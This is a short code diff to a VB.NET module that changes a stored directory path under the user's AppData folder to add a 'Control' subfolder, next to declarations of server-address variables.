@@ -6,7 +6,7 @@ Imports System.Threading
 Imports Microsoft.Win32
 Module GlobalUses
     Public parameters As String
-    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
+    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\Control"
     Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
     Public HttpOwnerServer As String
     Public HostOwnerServer As String
